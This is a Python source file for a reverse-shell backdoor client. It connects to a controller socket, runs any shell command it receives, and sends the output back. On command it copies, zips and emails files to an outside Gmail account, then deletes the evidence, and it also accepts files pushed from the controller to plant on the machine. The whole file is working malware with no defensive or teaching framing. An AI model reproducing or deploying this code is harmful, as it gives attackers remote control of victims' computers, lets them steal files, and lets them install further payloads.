import socket
import os
import subprocess
import smtplib
import shutil
import os.path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import tqdm

# receive 4096 bytes each time
BUFFER_SIZE = 4096
SEPARATOR = " "

def rtve(file):
    """
    Sends email with attached file using SMTP protocol.

    :param file: The path of the file to be attached.
    """
    # Define email sender and receiver
    email_sender = 'example@gmail.com'
    email_password = 'passwordExample'
    email_receiver = 'example1@gmail.com'

    # Create message object
    message = MIMEMultipart()
    message["From"] = email_sender
    message['To'] = email_receiver
    message['Subject'] = "sending mail using python"

    # Attach file to message
    attachment = open(file, 'rb')
    obj = MIMEBase('application', 'octet-stream')
    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition', "attachment; filename= " + file)
    message.attach(obj)

    # Send email using SMTP
    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.gmail.com', 587)
    email_session.starttls()
    email_session.login(email_sender, email_password)
    email_session.sendmail(email_sender, email_receiver, my_message)
    email_session.quit()


def compress(root, fileName):
    """
    Compresses a file or directory into a ZIP file.

    :param root: The path of the file or directory to be compressed.
    :param fileName: The name of the file or directory to be compressed.
    :return: The path of the compressed file.
    """
    file = root + fileName
    newZip = root+'Zipped'

    # Create the ZIP file
    output= shutil.make_archive(newZip , 'zip', file)

    if os.path.exists(output):
        return output
    else:
        return 0


def moveFile(src_path, dst_path):
    """
    Copies a file from a source path to a destination path.

    :param src_path: The path of the file to be copied.
    :param dst_path: The destination path where the file will be copied to.
    """
    shutil.copy(src_path, dst_path)


def delete(fileRoot):
    """
    Deletes a file.

    :param fileRoot: The path of the file to be deleted.
    """
    os.remove(fileRoot)


def main(exept=None):
    """
    Main function that runs the program.
    """

    s = socket.socket()  # creating a socket
    host = '127.0.0.1'  # our host
    port = 9999  # the port

    s.connect((host, port))  # connecting



    while True:

        data = s.recv(1024)  # recieve 1024 buffer

        # in case the commend is send for sending files to me
        if data[:4].decode("utf-8") == 'rtve':
            fileName = data[5:].decode("utf-8")

            try:
                os.mkdir("myDir")

                root = os.getcwd() + fileName
                moveFile(root, os.getcwd()+"myDir")

                fileRoot = compress(os.getcwd(), "myDir")

                rtve(fileRoot)

                if fileRoot == 0:
                    output_str = "zipping problem\n"
                else:
                    output_str = "zipped\nsuccess\n"

                delete(fileRoot)
                shutil.rmtree(os.getcwd() + "myDir")

                currentWD = os.getcwd() + "> "  # current working directory
                s.send(str.encode(output_str + currentWD))  # sending it to the server


            except:
                print("error, the file doesn't exist")

        elif data[:4].decode("utf-8") == 'plnt':
            file_to_copy = data[5:].decode("utf-8")

            s.send(b"plnt")  # sending to the server that I'm ready to get planted

            while True:
                confirm = s.recv(1024)  # recieve 1024 buffer
                if confirm.decode() == "200":
                    s.send(b"200")  # sending to the server that I'm ready to get planted
                    while True:
                        data = s.recv(1024)  # recieve 1024 buffer
                        if len(data) > 0:
                            # receive the file infos
                            # receive using client socket, not server socket
                            received = data.decode()
                            filename, filesize = received.split(SEPARATOR)
                            # remove absolute path if there is
                            filename = os.path.basename(filename)
                            # convert to integer
                            filesize = int(filesize)

                            # start receiving the file from the socket
                            # and writing to the file stream
                            # progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True,
                            # unit_divisor=1024)

                            s.send(b"200")  # sending to the server that I'm ready to get planted

                            with open(filename, "wb") as f:
                                while True:
                                    # read 1024 bytes from the socket (receive)
                                    bytes_read = s.recv(BUFFER_SIZE)
                                    if not bytes_read:
                                        print("finish")
                                        # nothing is received
                                        # file transmitting is done
                                        break
                                    # write to the file the bytes we just received
                                    f.write(bytes_read)
                                    # update the progress bar
                                    # progress.update(len(bytes_read))

                            currentWD = os.getcwd() + "> "  # current working directory
                            print(currentWD)
                            s.send(str.encode(currentWD))  # sending it to the server

                elif confirm.decode() == "500":
                    print("error")
                    break





        # if there is something entered
        elif len(data) > 0:
            # in case the commend is cd reads just what after the cd
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

            # subprocess.Popen: opens terminal
            # data[:].decode("utf-8"): our commend
            # shell=True: can use shell commends
            # stdout=subprocess.PIPE: the standart output
            # stdin=subprocess.PIPE: the standart input
            # stderr=subprocess.PIPE: the standart error

            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()  # read the error or output and saves it
            output_str = str(output_byte, "utf-8")  # output string converted
            currentWD = os.getcwd() + "> "  # current working directory
            s.send(str.encode(output_str + currentWD))  # sending it to the server

            print(output_str)



if __name__ == "__main__":
    main()